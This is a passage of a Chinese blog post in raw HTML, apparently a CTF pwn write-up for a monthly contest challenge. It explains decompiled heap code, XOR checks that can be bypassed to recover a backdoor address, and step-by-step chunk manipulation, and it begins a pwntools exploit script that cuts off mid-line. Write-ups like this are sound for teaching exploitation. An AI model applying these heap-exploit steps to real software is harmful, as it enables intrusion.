class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !*((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        **((_QWORD **)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4) = &amp;amp;&lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;content:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v7 = read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)(*((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4) + &lt;span class=&#34;number&#34;&gt;8LL&lt;/span&gt;), size - &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v7 &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          *(_BYTE *)(v7 + &lt;span class=&#34;number&#34;&gt;7LL&lt;/span&gt; + *((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4)) = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v1 = *(_WORD *)(v7 + &lt;span class=&#34;number&#34;&gt;14LL&lt;/span&gt; + *((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v8 = magicffff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 == &lt;span class=&#34;number&#34;&gt;8995&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          v8 = *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 (**)())(v7 + &lt;span class=&#34;number&#34;&gt;8LL&lt;/span&gt; + *((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt;= &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          *(_BYTE *)(v7 + (__int64)i + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + *((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4)) = ((__int64)v8 &amp;gt;&amp;gt; (&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; * (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)i)) ^ &lt;span class=&#34;number&#34;&gt;0x23&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v2 = *(_WORD *)(v7 + &lt;span class=&#34;number&#34;&gt;22LL&lt;/span&gt; + *((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v8 = magicffff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v2 == &lt;span class=&#34;number&#34;&gt;12850&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          v8 = *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 (**)())(v7 + &lt;span class=&#34;number&#34;&gt;16LL&lt;/span&gt; + *((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( j = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; j &amp;lt;= &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;; ++j )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          *(_BYTE *)(v7 + (__int64)j + &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt; + *((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4)) = ((__int64)v8 &amp;gt;&amp;gt; (&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; * (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)j)) ^ &lt;span class=&#34;number&#34;&gt;0x32&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v9;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v9;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		比较关键的几条语句如下:&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;**((_QWORD **)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4) = &amp;amp;&lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		这一条把堆块数据区开头8字节赋值了puts函数的地址&lt;/p&gt;
&lt;p&gt;​		然后从第8字节开始读入剩下的数据&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;v7 = read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)(*((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4) + &lt;span class=&#34;number&#34;&gt;8LL&lt;/span&gt;), size - &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		下面这两句刚开始没看懂,一直在想怎么样才能满足这个条件呢,这条语句的意思是,判断输入的数据后面第6字节是否等于8995, 14可以拆成两个来看 8 + 6, 8代表了puts的8字节, 6就是剩下的6字节, 然后判断这个地址的值是否等于8995,&lt;font color=&#34;red&#34;&gt;8995这样的数还是切换成16进制比较好! 因为在gdb中显示的基本都是16进制,这可能也是自己没判断出来相关关系的一个原因&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;v1 = *(_WORD *)(v7 + &lt;span class=&#34;number&#34;&gt;14LL&lt;/span&gt; + *((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 == &lt;span class=&#34;number&#34;&gt;8995&lt;/span&gt; )       v1 == &lt;span class=&#34;number&#34;&gt;0x2323&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		其实看不太懂没关系,完全可以在gdb中调试的时候发现端倪,在那两次奇怪的xor之后,能够看到符合条件的两个值,0x2323和0x3232&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230728215445598.png&#34; alt=&#34;image-20230728215445598&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		也就是说可以调整位置让程序符合这个判断条件,符合判断条件有什么用呢?&lt;/p&gt;
&lt;p&gt;​		如果不符合条件,v8仍然是后门函数的地址,那么xor后,仍然是一个无效地址,&lt;font color=&#34;red&#34;&gt;但如果已经xor过一次,通过进入0x2323的执行流,把v8的值设置为xor过一次的地址,那么再次xor后,就恢复原样了!就得到后门函数了&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; v8 = magicffff;       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 == &lt;span class=&#34;number&#34;&gt;0x2323&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          v8 = *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 (**)())(v7 + &lt;span class=&#34;number&#34;&gt;8LL&lt;/span&gt; + *((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt;= &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          *(_BYTE *)(v7 + (__int64)i + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + *((_QWORD *)&amp;amp;ptrs + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * size_4)) = ((__int64)v8 &amp;gt;&amp;gt; (&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; * (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)i)) ^ &lt;span class=&#34;number&#34;&gt;0x23&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;具体步骤&#34;&gt;&lt;a href=&#34;#具体步骤&#34; class=&#34;headerlink&#34; title=&#34;具体步骤&#34;&gt;&lt;/a&gt;具体步骤&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;刚开始两次add, 都添加大小为32的块，&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727120328851.png&#34; alt=&#34;image-20230727120328851&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;删除0号块&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727120539022.png&#34; alt=&#34;image-20230727120539022&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;申请40大小的块（32行吗？32不行，32的话，用不了下一个chunk的prev_size字段），输入31个a（不是32是因为后面会补一个0x00），然后后面两个8字节就被xor了，后面两个8字节，一个是size，一个是存放puts函数地址的，这样的话，就把magic xor后的数值存放到了这里， 所以后面的问题是如何解xor，当时也卡在了这里&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其实在调试中仔细观察的话（所以不能光空想！） 会发现有0x2323 0x3232，正好可以进入到两个判断条件中，  &lt;/p&gt;
&lt;p&gt;后面再进入0x23， 两次xor就回到原先的值了！&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727120606798.png&#34; alt=&#34;image-20230727120606798&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;再次释放0&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727170913465.png&#34; alt=&#34;image-20230727170913465&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;再次申请0 40,并填满&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727170922279.png&#34; alt=&#34;image-20230727170922279&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;show 1 就可以了&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;奥。。。明白为什么比赛的时候做题没做出来了。。没有看懂关键逻辑（以及想当然的以为xor后的东西看着一连串一样的，以为没啥用，其实地址0x55555当然很多一样的了。。）。。就像之前的那道题一样，都不需要写脚本，看懂逻辑了直接交互就可以了&lt;/p&gt;
&lt;p&gt;关键逻辑在add里面&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230728220659543.png&#34; alt=&#34;image-20230728220659543&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;偷一下exp&#34;&gt;&lt;a href=&#34;#偷一下exp&#34; class=&#34;headerlink&#34; title=&#34;偷一下exp&#34;&gt;&lt;/a&gt;偷一下exp&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; * &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; time &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sleep&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elfPath = &lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcPath = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;remoteAddr = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;remotePort = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.binary = elfPath&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;myelf = context.binary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; sys.argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] == &lt;span class=&#34;string&#34;&gt;&amp;#x27;l&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh = process(elfPath)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    libc = myelf.libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; sys.argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] == &lt;span class=&#34;string&#34;&gt;&amp;#x27;d&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       sh = process(elfPath, env = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;LD_PRELOAD&amp;#x27;&lt;/span&gt;: libcPath&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       sh = remote(remoteAddr,remotePort)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;info&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; libcPath:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       libc = ELF(libcPath)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        libc = myelf.libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;sz, content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;option:\n&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size:\n&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(sz))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content:\n&amp;#x27;&lt;/span&gt;, content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;option:\n&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;id:\n&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;option:\n&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;id:\n&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span 